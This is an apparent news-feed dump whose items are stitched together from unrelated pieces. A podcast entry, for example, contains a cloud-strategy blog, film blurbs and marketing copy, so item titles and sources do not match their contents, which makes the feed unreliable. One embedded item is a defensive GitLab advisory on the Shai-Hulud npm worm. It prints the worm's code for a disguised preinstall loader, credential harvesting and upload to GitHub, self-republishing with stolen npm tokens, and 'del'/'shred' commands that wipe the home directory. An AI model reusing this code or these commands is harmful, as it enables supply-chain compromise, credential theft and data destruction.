The Office for Budget Responsibility expects the tax to generate $1.45 billion in its first year and $2.51 billion by 2030-31, offsetting about a quarter of the revenue losses projected from the EV transition by 2050. The Society of Motor Manufacturers and Traders warned the new charge would "suppress demand" and make sales targets harder to achieve. New Zealand and Iceland have already introduced road pricing for EVs; demand dropped in the former but held steady in the latter.]]></content:encoded></item><item><title>Joe Rogan Experience #2419 - John Lisle</title><link>https://www.youtube.com/watch?v=ZrUQdGi0HF8</link><author>PowerfulJRE</author><category>podcast</category><enclosure url="https://www.youtube.com/v/ZrUQdGi0HF8?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 18:00:44 +0000</pubDate><source url="https://www.youtube.com/channel/UCzQUP1qoWDoEbmsQxvdjxgQ">Podcast - Joe Rogan</source><content:encoded><![CDATA[John Lisle has a Ph.D. in history from the University of Texas, where he is now a professor of the history of science.

Moreover, as AI workloads become much more complex and the volume of data that is to be processed grows, there is a need for robust and scalable hosting solutions.Cloud has emerged as the ideal solution because of its ability to provide on-demand resources, secure AI computing environments, and scale infrastructure without physical overhead. But, AI workloads are not one-size-fits-all; they vary with the scale of your business, your chosen use case, as well as the scale (and quality) of your data.As a result, enterprises face a critical question: which cloud strategy is most suitable for their AI compute demands? Multi-cloud, hybrid cloud, or service models (IaaS, PaaS, or SaaS)?This blog examines each cloud strategy in detail, exploring how businesses can make informed decisions, optimize cloud infrastructure, and navigate governance to maximize their AI computing potential.Traditional cloud strategies, particularly relying on a single cloud provider, often fall short when handling the dynamic demands of AI computing. Here are key reasons why:: Single-cloud strategies (e.g., AWS, GCP, or Azure) can result in vendor lock-ins and restrict scalability, limiting your ability to choose the best-fit services for AI workloads.: AI requires real-time processing and centralized data access for efficient performance. Single-cloud models often introduce latency, failing to meet the needs for AI orchestration and edge computing.: As AI workloads expand, data transfer costs and vendor lock-in increase (sometimes even exceeding the cost of migrating to the cloud), reducing ROI and hindering cloud cost optimization for AI.Security & Compliance Issues: Traditional cloud strategies may struggle to comply with specific data sovereignty regulations across different regions.: Relying on a single cloud platform limits access to certain services, which are essential for AI-driven cloud workload management.Three main cloud strategies work well for complex, growing AI workloads:Service Models: Infrastructure-as-a-Service (IaaS), Platform-as-a-Service (PaaS), and Software-as-a-Service (SaaS)Let’s dig deeper into each and assess cloud strategy dominance for AI workloads in 2026.Multi-Cloud Strategy for AIIn a multi-cloud strategy, businesses use certain services from one cloud platform and another set of services from the other. The bifurcation is spread across multiple clouds (e.g., AWS, Azure, and Google Cloud), improving how diverse AI workloads and applications are managed.With this cloud strategy, you can benefit from the flexibility of choosing prominent service offerings (such as specialized ML services or computing power) of each provider.Why is a Multi-Cloud Strategy Suitable for AI Workloads?It is well-suited for AI workloads that require a combination of high-performance computing and real-time data processing capabilities/services.For example, training large AI models may require high GPU resources from one provider, while real-time inference could be better served by edge computing services from another.Benefits of a Multi-Cloud StrategyCost Implications of a Multi-Cloud StrategyThe cost of running your AI workloads on multiple cloud platforms depends on several factors (your data, use case, etc.), but generally is calculated through a pay-as-you-go pricing model—for all cloud platforms involved.This can quickly add to the overall costs if not optimized carefully.Using one cloud platform for high-performance computing and another for data storage or processing.Challenges in Implementing a Multi-Cloud Strategy for AI - When you manage multiple cloud environments, data pipelines, and AI workloads, the operational complexity naturally increases.Data Governance Becomes Tough - Keeping an eye on all AI and data workloads is very tough across multiple environments when you also have to adhere to varying governance policies and compliance requirements.Hybrid Cloud Strategy for AIWhen using a hybrid cloud strategy for AI, organizations typically keep specific workloads on-premises (or in a private cloud) and others on public cloud platforms.Why is a Hybrid Cloud Strategy Suitable for AI Workloads?For AI workloads that involve sensitive user data (e.g., customer PII or financial information) for training, hybrid cloud strategies are ideal. They enable businesses to maintain control over critical applications and sensitive data, while leveraging the flexibility of public clouds for computing power.Benefits of a Hybrid Cloud StrategyAbility to scale without overhauling IT infrastructureTighter compliance and securityAdherence to data privacy and security regulations (GPDR, CCPA, SOC 1 and 2, etc) becomes easierCost Implications of a Hybrid Cloud StrategyThe cost of using a hybrid cloud strategy can be slightly higher as you also have to maintain your infrastructure (including hardware) in addition to the cloud environment. But, there are still ways to optimize cloud costs.Sensitive data management, particularly in regulated industries like finance and healthcare, is the most common use case for a hybrid cloud strategy.Challenges in Implementing a Hybrid Cloud Strategy for AIComplexity of Integrating On-Prem Data with Cloud-Based Applications - Setting up ETL/ELT data pipelines from private infrastructure to the cloud requires several custom solutions and integration tools.Cloud Cost Management Becomes Tough: Managing costs across both on-premises and cloud infrastructure can be tricky. You will need to monitor everything to avoid over- or under-provisioning cloud resources constantly.Managed Service Models for AIRelying on service models (managed by cloud providers) like IaaS, PaaS, or SaaS is another way to benefit from flexible scaling and ease of computing.IaaS (Infrastructure-as-a-Service): In this cloud strategy, enterprises use virtual computing resources (compute power, storage methods, network elements, etc). They can easily scale (up or down) based on the need and pay for only what has been used. Custom AI training and development workloads.Paas (Platform-as-a-Service) In this cloud strategy, enterprises use dedicated platforms to build, run, and manage AI workloads and applications. This allows teams to quickly deploy AI models, allowing them to focus on developing the models rather than managing the infrastructure.: Ideal for AI model deployment in dynamic environments or when you need to scale quickly.SaaS (Software-as-a-Service) In this cloud strategy, enterprises use fully managed software apps hosted by the cloud provider of their choice. It could be an AI tool, an AI platform to which you subscribe, etc.: Best suited for businesses that require pre-trained AI models.Why Service Models are Suitable for AI Workloads?Service models provide organizations with the flexibility to adjust their cloud usage without worrying about the infrastructure.Benefits of Service ModelsIaaS provides the infrastructure for training models.PaaS simplifies model development and deployment.SaaS provides ready-to-use AI apps and services, eliminating the need for development.Cost Implications of Service ModelsIaaS and PaaS are mostly offered with pay-as-you-go cost models, while SaaS is often provided through a subscription-based pricing model.IaaS is perfect when you have to train AI models using robust GPUs/TPUs and do not want to invest in physical hardware. Similarly, PaaS is often used when you need built-in support for analytics and machine learning, which can be achieved through CI/CD pipelines and APIs. Lastly, the SaaS model is best suited for use when you need ready-made solutions, such as chatbots and sentiment analysis engines.Challenges in Implementing a Service-Driven Cloud Strategy for AIWhile it is beneficial to manage AI workloads through a service model, it introduces many challenges.With third-party services, there are risks around data governance and compliance.For the same reason, you may end up in a vendor lock-in situation if reliance on a particular cloud platform is heavy.Services are cost-effective until they’re not—and this transition often occurs in a fraction of the time, as costs are usually unpredictable initially.Service models offer pre-determined access to features. Customization scope for particular AI needs is, hence, restricted or very costly.How to Choose the Right Cloud Strategy for Your AI Workloads?Selecting the best cloud strategy for AI workloads is a crucial decision that determines whether you will succeed, how much you will spend, and how quickly you can deploy AI. Here is a practical framework that you can refer to when selecting a strategy and optimizing cloud costs for AI.1. Make a Profile of your AI WorkloadsWhat type of an AI workflow do you need?Will you be working with large datasets?How much computing power will this data require?Do you require real-time processing, or is a modest latency acceptable?2. Assess Data SensitivityDoes your AI workload require sensitive data?3. Consider the Financial ImpactHave you thought of a budget? If not, determine a cloud cost optimization approach and estimate the associated financial implications.Consider the data privacy and compliance regulations that you have to adhere to.Finding answers to the above questions and points of consideration will help you choose an ideal cloud strategy for your AI workloads. If you are not able to make this assessment, consider seeking help from a cloud service provider. Their cloud consultants can do a thorough evaluation of your workload and recommend a suitable cloud strategy.If you are just beginning to migrate your AI workloads to the cloud, it is advisable to work closely with a cloud migration service partner to ensure a smooth transition.With increasingly complex AI workloads and growing data volumes, moving to the cloud is no longer a question, but an imperative. Instead, the question facing enterprises today is which cloud strategy to adopt, as this decision determines how your AI is built, managed, and deployed for maximum ROI. Whether you opt for a multi-cloud, hybrid, or service-driven approach, the key to success lies in aligning your cloud model with your specific AI needs, whether that involves high computing or stronger governance. Those who can strategically make this decision will not just stay ahead in the AI race but also unlock new levels of innovation and operational excellence in 2026 and beyond.]]></content:encoded></item><item><title>Afghan national charged with shooting National Guard drove across US, officials say</title><link>https://www.youtube.com/shorts/15AyuWuhOwM</link><author>Associated Press</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/15AyuWuhOwM?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 17:51:02 +0000</pubDate><source url="https://www.youtube.com/channel/UC52X5wxOL_s5yw0dQk7NtgA">News - AP</source><content:encoded><![CDATA[An Afghan national who worked for the CIA in his native country and arrived in the U.S. in 2021 drove across the country from Washington state to shoot two West Virginia National Guard members just blocks from the White House, U.S. officials said Thursday.

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L.

The US company puts pressure on retailers and exerts influence on pricing policies, thus fueling cut-throat competition.

Amazon attracts customers with low prices - but according to a former manager at the company, the reason for this is not what consumers might think. She claims that the company's aim is not to give customers fair deals but to put retailers and manufacturers under enormous pressure.

This investigative documentary reveals the questionable methods used by the company: suppliers are prevented from selling their products below the Amazon-listed price - whether that be online or in a physical store. Insiders say that this practice not only distorts competition, but also has direct consequences for customers in the form of price rises

A source familiar with negotiations told The Verge that there are significant concerns that the language in the National Defense Authorization Act will be swapped out for a "data-as-a-service" alternative that would require the Department of Defense to pay contractors for access to technical repair data. 

The provision, introduced by Sens. Elizabeth Warren (D-MA) and Tim Sheehy (R-MT) in their Warrior Right to Repair Act, passed the Senate in October and has support from Defense Secretary Pete Hegseth, the Army and the Navy. The National Defense Industrial Association published a white paper backing the data-as-a-service model, arguing it would protect contractors' intellectual property. Reps. Mike Rogers (R-AL) and Adam Smith (D-WA), who lead the House Armed Services Committee, outlined similar language in their SPEED Act. Rogers received more than $535,000 from the defense industry in 2024; Smith received over $310,550.

Others say consciousness is irreducible and fundamental, whether part of ultimate reality or all of it. Does it make sense to explore consciousness and cosmos together?

But it is the truth: your end users don’t care what your product/service is made of. They only care what it can help them do— better, quicker, or cheaper.And that’s the way it should be.Society, as it operates today, is propped up by the symbiosis of trust and specialized expertise. Person A commits their life to mastering a field, say Medicine, confident that person B is doing the same with Engineering. Person A trusts that, as he can attend to Person B’s medical needs, Person B can, in turn, build and maintain the systems Person A relies on.Your users trust you in the same way. They assume you’ve figured the tech out, and unless they’re developers or you’re building for a B2B audience, they couldn’t care less about how it works. They only care about what it means for them.Knowing this helps you build a content strategy that speaks directly to the people you want to reach. Here are a few practical ways to do that.1. Translate Feature into FeelingReframe all your amazing tech as a human benefit.The smartphone market leader could’ve spent years going on about aperture sizes and sensor upgrades. Instead,  showed ‘ordinary people’ making cinematic images, with the implied message: “You can make this, too.” They signaled to potential buyers that with all of this great tech (that you probably don’t care about, or even understand), you tool could make cool-looking cinematic videos on the iPhone.When you write about your features, save the technical details for a technical audience, and focus on what you expect your ideal users to do with said feature.2. Replace Explanations With DemonstrationsIn short, show, don’t tell.Cloud storage was abstract and unfamiliar when Dropbox launched. Instead of long copy, they used a simple explainer video on their homepage. That one video reportedly lifted conversions by over 10%, drove hundreds of thousands of views in a month.If your homepage still leads with dense copy, you’re leaving money on the table. Create one piece of “show, don’t tell” content (video, interactive demo, live product tour) and make  the hero asset. Everything else can support it.3. Anchor Your Messaging in Real-World ScenariosAt this point in the article, this should be apparent.People connect much more with things they can relate to. And Airbnb’s  campaign plugged into this.With , Airbnb stopped selling “rooms” and started selling the scenario: what it feels like to live in a place, not just pass through it. The campaign leaned into words like “live,” “belong,” and “local,” and the visuals focused on real neighborhoods, hosts, and daily rituals instead of generic landmarks. Case studies highlight how the campaign repositioned Airbnb from a budget lodging alternative to an experience-driven lifestyle brand and boosted engagement and advocacy.\
A content strategy built on outcomes instead of internals helps your users see your product clearly and see themselves in the story you’re telling. And if you want to scale that visibility with the same clarity these companies used, HackerNoon can help with that!Starting at only $5k, you get to:Publish three evergreen content pieces on HackerNoon (with canonical tags)Translations into 76 languages for each of the three storiesAdvertise your product for a week on a targeted categoryHackerNoon Startups of the WeekSkylight Ventures funds early-stage founders building in underserved communities.

Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:Harvests credentials from GitHub, npm, AWS, GCP, and AzureExfiltrates stolen data to attacker-controlled GitHub repositoriesPropagates by automatically infecting other packages owned by victimsContains a destructive payload that triggers if the malware loses access to its infrastructureWhile we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.Technical analysis: How the attack unfolds The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified  with a preinstall script pointing to . This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
The  loader downloads or locates the Bun runtime on the system, then executes the bundled  payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.Once executed, the malware immediately begins credential discovery across multiple sources:: Searches environment variables and GitHub CLI configurations for tokens starting with  (GitHub personal access token) or (GitHub OAuth token): Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services: Extracts tokens for package publishing from  files and environment variables, which are common locations for securely storing sensitive configuration and credentials.: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git historyasync function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
Data exfiltration network The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,

      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token && await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
Using stolen npm tokens, the malware:Downloads all packages maintained by the victimInjects the  loader into each package's preinstall scriptsBundles the malicious  payloadIncrements the package version numberRepublishes the infected packages to npmasync function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
Our analysis uncovered a destructive payload designed to protect the malware’s infrastructure against takedown attempts.The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses  to overwrite files before deletion, making recovery nearly impossible.// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" && " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" & " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 && " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.Malicious post-install script in node_modules directoriesHidden directory created in user home for Trufflehog binary storageTemporary directory used for binary extraction.truffler-cache/trufflehogDownloaded Trufflehog binary (Linux/Mac).truffler-cache/trufflehog.exeDownloaded Trufflehog binary (Windows)del /F /Q /S "%USERPROFILE%*"Windows destructive payload commandLinux/Mac destructive payload commandWindows secure deletion command in payloadcurl -fsSL https://bun.sh/install | bashSuspicious Bun installation during NPM package installpowershell -c "irm bun.sh/install.ps1|iex"Windows Bun installation via PowerShellHow GitLab can help you detect this malware campaign If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.First, enable  to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your  or  files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.Next,  can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:"Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?""Does this project have any npm supply chain vulnerabilities?""Does this project have any npm supply chain vulnerabilities?""Show me critical vulnerabilities in my JavaScript dependencies."The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.]]></content:encoded></item><item><title>Greed or Inflation?

Google uses Dotprompt in Firebase Genkit and I wanted something simpler - just run a .prompt file directly on the command line.Here's what it looks like:---
model: anthropic/claude-sonnet-4-20250514
output:
  format: json
  schema:
    sentiment: string, positive/negative/neutral
    confidence: number, 0-1 score
---
Analyze the sentiment of: {{STDIN}}cat reviews.txt | ./runprompt sentiment.prompt | jq '.sentiment'The things I think are interesting:* Structured output schemas: Define JSON schemas in the frontmatter using a simple `field: type, description` syntax. The LLM reliably returns valid JSON you can pipe to other tools.* Prompt chaining: Pipe JSON output from one prompt as template variables into the next. This makes it easy to build multi-step agentic workflows as simple shell pipelines.* Zero dependencies: It's a single Python file that uses only stdlib. Just curl it down and run it.* Provider agnostic: Works with Anthropic, OpenAI, Google AI, and OpenRouter (which gives you access to dozens of models through one API key).You can use it to automate things like extracting structured data from unstructured text, generating reports from logs, and building small agentic workflows without spinning up a whole framework.Would love your feedback, and PRs are most welcome!]]></content:encoded></item><item><title>“When Ukrainian Forces Withdraw from the Territories They Hold—that Is When Hostilities Will Cease. If They Do Not Withdraw—we Will Achieve It by Military Means.” Putin Made a Series of Statements on How to Resolve the War in Ukraine</title><link>https://sfg.media/en/a/ukraines-forces-will-withdraw-or-russia-will-use-force/</link><author>/u/sergeyfomkin</author><category>news</category><category>reddit</category><pubDate>Thu, 27 Nov 2025 14:07:42 +0000</pubDate><source url="https://www.reddit.com/r/europe/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - Europe</source><content:encoded><![CDATA[
                Today, November 27, 2025, Vladimir Putin delivered a series of statements on the prospects for resolving the war in Ukraine and on the parameters of Donald Trump’s proposed peace plan.
            
            Vladimir Putin said that a U.S. delegation will arrive in Moscow next week to discuss Donald Trump’s peace plan. According to him, “we are expecting them in the first half of next week”.
        
            The Russian president stressed that there is still no full draft of a peace agreement. He said the discussions so far concerned only a list of issues proposed for consideration: “There was a set of questions that were proposed for discussion”. Putin also said that after the meeting between U.S. and Ukrainian representatives in Geneva, the 28 points of Trump’s plan were divided into four sections.
        
            Putin described one of the key issues in the talks with the United States as the international 
            He noted that Russia is, in principle, prepared to treat this list as a basis for future agreements to end the Russian-Ukrainian war. At the same time, he said that “everything needs to be put into diplomatic language”. Yet the Russian president argued that “signing documents with the Ukrainian leadership is pointless; they made a strategic mistake when they were afraid to hold elections”.
        
            According to Putin,  His statement said that at this stage it is “legally impossible” to conclude an agreement with Ukraine. The Russian president stressed that Moscow requires international recognition of any arrangements and of the future status of the territories: “We need our decisions to be internationally recognized by the key global players. It is one thing if the territories are under Russian sovereignty and, in the event of a breach of the agreement, this would constitute an attack on Russia with all the corresponding response measures. It is another if it is seen as an attempt to reclaim territory that legally belongs to Ukraine. That is why we need recognition—but not from Ukraine today”.
        
            Putin said that Russia is ready to end the war if “Ukraine’s forces withdraw from the territories they hold—only then will the fighting stop. If they do not withdraw—we will achieve this by military means”.
        
                  Putin’s statement that hostilities will cease if “Ukraine’s forces withdraw from the territories they hold”.
                
            Putin claimed that Whitcoff is being attacked and pushed to continue the fighting by those forces that “want to keep stealing money together with the Ukrainian establishment and fight to the last Ukrainian”.
        
            “We are ready for this,” Putin said.

Meta Platforms Inc. is in talks to spend billions on Google’s AI chips, the Information reported, adding to a monthslong share rally as the search giant has made the case it can rival Nvidia Corp. as a leader in artificial intelligence technology.
A deal would signal growing momentum for Google’s chips and long-term potential to challenge Nvidia’s market dominance, after the company earlier agreed to supply up to 1 million chips to Anthropic PBC.
Google owner Alphabet Inc. is on track to hit a $4 trillion market valuation for the first time when trading opens in New York on Wednesday. Nvidia’s shares were down about 4% in premarket trading.
Meta is in discussions to use the Google chips — known as tensor processing units, or TPUs — in data centers in 2027, The Information reported, citing an unidentified person familiar with the talks. Meta also may rent chips from Google’s cloud division next year, the news outlet said.
An agreement would help establish TPUs as an alternative to Nvidia’s chips, the gold standard for big tech firms and startups from Meta to OpenAI that need computing power to develop and run artificial intelligence platforms.
Nvidia’s stock is already facing headwinds as investors fear a broader AI bubble. Michael Burry, immortalized in The Big Short for his bets against the housing market during the 2008 financial crisis, has scrutinized the chipmaker over circular AI deals, hardware depreciation and revenue recognition.
After Google’s Anthropic deal was announced, Seaport analyst Jay Goldberg called it a “really powerful validation” for TPUs. “A lot of people were already thinking about it, and a lot more people are probably thinking about it now,” he said.
“Google Cloud is experiencing accelerating demand for both our custom TPUs and NVIDIA GPUs; we are committed to supporting both, as we have for years,” a spokesperson for Google said.

But how did this country, once considered one of Latin America’s most peaceful, became a “war zone”? 

Ecuador has become an attractive logistical hub for local and international cartels – due in part to its location between two of the world's largest cocaine producers, Colombia and Peru. 

Growing demand for cocaine in Europe, one of its main markets, is considered to be fuelling the surge in extreme violence seen in cities like Guayaquil.

The answer, according to their analysis: 11.7% of the US labor market's total wage value, or about $1.2 trillion, sits in tasks that AI systems can technically perform [PDF]. 

The researchers call this the Iceberg Index, and the name is deliberate. The visible AI disruption happening in tech jobs right now accounts for only 2.2% of labor market wage value. The remaining exposure lurks in cognitive and administrative work across finance, healthcare administration, and professional services, and unlike tech-sector disruption, it's spread across all fifty states rather than concentrated on the coasts. 

Delaware and South Dakota show higher Iceberg Index values than California because their economies lean heavily on administrative and financial work. Ohio and Tennessee register modest tech-sector exposure but substantial hidden risk in the white-collar functions that support their manufacturing bases. 

To validate the framework, the researchers compared their predictions against Anthropic's Economic Index tracking real-world AI usage from millions of Claude users. The two measures agreed on state categorizations 69% of the time, with particularly strong alignment at the extremes. 

The Iceberg Index doesn't predict job losses or adoption timelines. It measures technical capability, the overlap between what AI can do and what occupations require. Traditional economic indicators like GDP and unemployment explain less than five percent of the variation in this skill-based exposure, which is partly why the researchers argue workforce planners need new metrics.]]></content:encoded></item><item><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><link>https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference</link><author>vegasbrianc</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 13:28:34 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.The history of the TPU and why it all even started?The difference between a TPU and a GPU?Performance numbers TPU vs GPU?Where are the problems for the wider adoption of TPUsGoogle’s TPU is the biggest competitive advantage of its cloud business for the next 10 yearsHow many TPUs does Google produce today, and how big can that get?Gemini 3 and the aftermath of Gemini 3 on the whole chip industryThe history of the TPU and why it all even started?The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google’s leadership—specifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team—ran a projection that alarmed them. They calculated that if every Android user utilized Google’s new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.ASIC (Application-Specific Integrated Circuit)Key Historical Milestones:This urgency to solve the “data center doubling” problem is why the TPU exists. It wasn’t built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the »costly« AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.The difference between a TPU and a GPU?To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a “general-purpose” parallel processor, while a TPU is a “domain-specific” architecture.The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry “architectural baggage.” They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.The “Systolic Array” is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).In a TPU’s systolic array, data flows through the chip like blood through a heart (hence “systolic”).It loads data (weights) once.It passes inputs through a massive grid of multipliers.The data is passed directly to the next unit in the array without writing back to memory.What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.Google’s new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia’s Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google’s 